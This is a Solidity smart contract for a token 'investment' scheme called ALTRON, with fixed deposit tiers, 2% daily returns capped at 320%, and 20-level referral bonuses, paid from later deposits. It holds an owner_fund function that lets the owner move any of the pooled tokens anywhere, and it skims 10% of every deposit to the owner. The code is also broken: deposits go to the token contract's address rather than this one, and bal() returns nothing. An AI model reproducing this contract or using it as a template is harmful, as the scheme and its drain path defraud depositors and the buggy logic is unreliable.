//SourceUnit: contract.sol

pragma solidity 0.5.9;

interface ArilCoin {
    function balanceOf(address _owner) view external  returns (uint256 balance);
    function allowance(address _owner, address _spender) view external  returns (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    function transfer(address _to, uint256 _amount) external  returns (bool success);
    function transferFrom(address _from,address _to, uint256 _amount) external  returns (bool success);
    function approve(address _to, uint256 _amount) external  returns (bool success);
    function _mint(address account, uint256 amount) external ;
    
}

contract ALTRON {
	using SafeMath for uint256;
	ArilCoin public tokenInstance;
	address contractAddress;
	address payable internal creator1;
	address payable internal owner;
	uint256 constant public BASE_PERCENT = 20;
	uint256[20] public REFERRAL_PERCENTS = [200, 100,60,40,20,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10];
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 86400 seconds;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
		uint256 checkpoint;
	}

	struct User {
		Deposit[] deposits;
		address referrer;
		uint256 bonus;
		uint256 level;
		address[] reffrals;
	}

	mapping (address => User) public users;

	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	constructor(address tokenAddress) public {
		owner=msg.sender;
		 tokenInstance=ArilCoin(tokenAddress);
           contractAddress=tokenAddress;
	}

    modifier investAmount(uint256 _value){
       require(_value==500000000 || _value==1000000000||_value==2500000000||_value==5000000000||_value==10000000000||_value==50000000000
       ||_value==75000000000||_value==100000000000||_value==125000000000||_value==150000000000
       ||_value==200000000000||_value==30000000000||_value==500000000000,"You have to enter right amount");
       _;
    }

	function invest(address referrer,uint256 _value) public investAmount(_value) {
        require(tokenInstance.balanceOf(msg.sender)>0,"You have not enough coins ");
        // require(users[msg.sender].deposits[users[msg.sender].deposits.length].amount<=_value,"You have to enter higher amount Than previuous");
	    
		tokenInstance.transferFrom(msg.sender,contractAddress,_value);

		if (users[msg.sender].referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
			users[msg.sender].referrer = referrer;
			users[referrer].reffrals.push(msg.sender);
		}
		else if(msg.sender!=owner&&users[msg.sender].referrer == address(0)&& users[referrer].deposits.length > 0 && referrer != msg.sender){
		    users[msg.sender].referrer = owner;
		    users[owner].reffrals.push(msg.sender);
		}
		
		 if (users[msg.sender].referrer != address(0)) {

			address upline = users[msg.sender].referrer;
// 			for (uint256 i = 0; i < 20; i++) {
// 				if (upline != address(0)) {
// 				    if(users[upline].reffrals.length){
// 						users[upline].level = users[upline].level.add(1);	
// 					} 
// 					if(users[upline].referrer==owner){
// 					    upline = owner;
// 					}
// 					else{
// 					upline = users[upline].referrer;
// 					}
					
// 				} else break;
// 			}
 
 users[upline].level =users[upline].reffrals.length;
 					

		}
		 
    if (users[msg.sender].deposits.length == 0) {
			totalUsers = totalUsers.add(1);
		}
		users[msg.sender].deposits.push(Deposit(_value, 0, block.timestamp,block.timestamp));
		totalInvested = totalInvested.add(_value);
		totalDeposits = totalDeposits.add(1);
		tokenInstance.transfer(owner,_value.mul(10).div(100));
		emit NewDeposit(msg.sender, _value);

	}

	function withdraw() public {
		uint256 totalAmount;
		uint256 dividends;

		for (uint256 i = 0; i < users[msg.sender].deposits.length; i++) {

			if (users[msg.sender].deposits[i].withdrawn < users[msg.sender].deposits[i].amount.mul(320).div(100)) {


					dividends = (users[msg.sender].deposits[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(users[msg.sender].deposits[i].start))
						.div(TIME_STEP);

				if (users[msg.sender].deposits[i].withdrawn.add(dividends) > users[msg.sender].deposits[i].amount.mul(320).div(100)) {
					dividends = (users[msg.sender].deposits[i].amount.mul(320).div(100)).sub(users[msg.sender].deposits[i].withdrawn);
				}

				users[msg.sender].deposits[i].withdrawn = users[msg.sender].deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			}
			
			users[msg.sender].deposits[i].start=now;
		}

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			totalAmount = totalAmount.add(referralBonus);
			users[msg.sender].bonus = 0;
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = tokenInstance.balanceOf(address(this));
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}


	tokenInstance.transfer(msg.sender,totalAmount);
	   if (users[msg.sender].referrer != address(0)) {

			address upline = users[msg.sender].referrer;
			for (uint256 i = 0; i < 20; i++) {
				if (upline != address(0)) {
					if(users[upline].reffrals.length>=i+1){
					uint256 amount = totalAmount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					} 
					if(users[upline].referrer==owner){
					    upline = owner;
					}
					else{
					upline = users[upline].referrer;
					}
				} else break;
			}

		}

		totalWithdrawn = totalWithdrawn.add(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);

	}

	function getContractBalance() public view returns (uint256) {
		return tokenInstance.balanceOf(address(this));
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];


		uint256 totalDividends;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(320).div(100)) {

					dividends = (user.deposits[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);
				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(320).div(100)) {
					dividends = (user.deposits[i].amount.mul(320).div(100)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);

			}

		}

		return totalDividends;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(320).div(100)) {
				return true;
			}
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256,uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start,user.deposits[index].checkpoint);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserDownlineCount(address userAddress) public view returns(address[] memory) {
	 	return (users[userAddress].reffrals);
	 	
	}


	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
        function owner_fund(address _to,uint256 _value)public   returns (bool){
            require(msg.sender==owner);
        tokenInstance.transfer(_to,_value);
        return true;
    }
    function bal()view public returns(uint256){
        tokenInstance.balanceOf(address(this));
    } 

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
    
}